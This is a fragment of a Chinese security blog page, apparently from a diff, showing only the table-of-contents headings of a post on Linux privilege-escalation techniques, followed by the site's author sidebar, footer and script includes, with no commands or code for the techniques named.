class="nav-item nav-level-3"><a class="nav-link" href="#sudo-LD-PRELOAD环境变量提权"><span class="nav-number">6.19.</span> <span class="nav-text">sudo LD_PRELOAD环境变量提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#记一个比较秀的sudo提权"><span class="nav-number">6.20.</span> <span class="nav-text">记一个比较秀的sudo提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Capabilities"><span class="nav-number">7.</span> <span class="nav-text">Capabilities</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#管理工具"><span class="nav-number">7.1.</span> <span class="nav-text">管理工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查找设置了Capabilities的可执行文件"><span class="nav-number">7.2.</span> <span class="nav-text">查找设置了Capabilities的可执行文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#perl"><span class="nav-number">7.3.</span> <span class="nav-text">perl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb"><span class="nav-number">7.4.</span> <span class="nav-text">gdb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php"><span class="nav-number">7.5.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python"><span class="nav-number">7.6.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rvim"><span class="nav-number">7.7.</span> <span class="nav-text">rvim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vim"><span class="nav-number">7.8.</span> <span class="nav-text">vim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tar"><span class="nav-number">7.9.</span> <span class="nav-text">tar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#openssl"><span class="nav-number">7.10.</span> <span class="nav-text">openssl</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cron-jobs-提权"><span class="nav-number">8.</span> <span class="nav-text">cron jobs 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cron-jobs-文件权限（文件重写）"><span class="nav-number">8.1.</span> <span class="nav-text">cron jobs 文件权限（文件重写）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cron-jobs环境变量提权"><span class="nav-number">8.2.</span> <span class="nav-text">cron jobs环境变量提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cron-jobs-通配符提权"><span class="nav-number">8.3.</span> <span class="nav-text">cron jobs 通配符提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境变量提权-劫持环境变量"><span class="nav-number">9.</span> <span class="nav-text">环境变量提权(劫持环境变量)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内核漏洞提权"><span class="nav-number">10.</span> <span class="nav-text">内核漏洞提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#脏牛提权-CVE-2016-5195"><span class="nav-number">10.1.</span> <span class="nav-text">脏牛提权 CVE-2016-5195</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2003-0127"><span class="nav-number">10.2.</span> <span class="nav-text">CVE-2003-0127</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2009-2698"><span class="nav-number">10.3.</span> <span class="nav-text">CVE-2009-2698</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2010-2959"><span class="nav-number">10.4.</span> <span class="nav-text">CVE-2010-2959</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2013-2094"><span class="nav-number">10.5.</span> <span class="nav-text">CVE-2013-2094</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2017-16995"><span class="nav-number">10.6.</span> <span class="nav-text">CVE-2017-16995</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2010-4170"><span class="nav-number">10.7.</span> <span class="nav-text">CVE-2010-4170</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2002-0056"><span class="nav-number">10.8.</span> <span class="nav-text">CVE-2002-0056</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他第三方程序"><span class="nav-number">11.</span> <span class="nav-text">其他第三方程序</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#USBCreator-D-Bus"><span class="nav-number">11.1.</span> <span class="nav-text">USBCreator D-Bus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Docker提权"><span class="nav-number">11.2.</span> <span class="nav-text">Docker提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Docker-remote-api"><span class="nav-number">11.2.1.</span> <span class="nav-text">Docker remote api</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用"><span class="nav-number">11.2.1.1.</span> <span class="nav-text">利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LXD容器提权"><span class="nav-number">11.3.</span> <span class="nav-text">LXD容器提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kubernetes-容器"><span class="nav-number">11.4.</span> <span class="nav-text">Kubernetes 容器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2018-1002105"><span class="nav-number">11.4.1.</span> <span class="nav-text">CVE-2018-1002105</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2017-1002101"><span class="nav-number">11.4.2.</span> <span class="nav-text">CVE-2017-1002101</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql提权"><span class="nav-number">11.5.</span> <span class="nav-text">Mysql提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sql注入读取文件without-sqlmap"><span class="nav-number">11.5.1.</span> <span class="nav-text">sql注入读取文件without sqlmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写一句话获得webshell"><span class="nav-number">11.5.2.</span> <span class="nav-text">写一句话获得webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#secure-file-priv写一句话"><span class="nav-number">11.5.2.1.</span> <span class="nav-text">secure-file-priv写一句话</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#日志写入一句话"><span class="nav-number">11.5.2.2.</span> <span class="nav-text">日志写入一句话</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UDF"><span class="nav-number">11.5.3.</span> <span class="nav-text">UDF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NFS"><span class="nav-number">11.6.</span> <span class="nav-text">NFS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NFS版本漏洞"><span class="nav-number">11.6.1.</span> <span class="nav-text">NFS版本漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#权限配置不当"><span class="nav-number">11.6.2.</span> <span class="nav-text">权限配置不当</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#共享目录可写"><span class="nav-number">11.6.3.</span> <span class="nav-text">共享目录可写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#敏感信息泄露-1"><span class="nav-number">11.6.4.</span> <span class="nav-text">敏感信息泄露</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB"><span class="nav-number">11.7.</span> <span class="nav-text">SMB</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SMB-Cry"><span class="nav-number">11.7.1.</span> <span class="nav-text">SMB_Cry</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2010-0926-Samba-smbd默认配置目录遍历漏洞"><span class="nav-number">11.7.2.</span> <span class="nav-text">CVE-2010-0926 Samba smbd默认配置目录遍历漏洞 </span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他"><span class="nav-number">12.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rbash逃逸"><span class="nav-number">12.1.</span> <span class="nav-text">rbash逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bash-dropping-privileges"><span class="nav-number">12.2.</span> <span class="nav-text">Bash dropping privileges</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">13.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
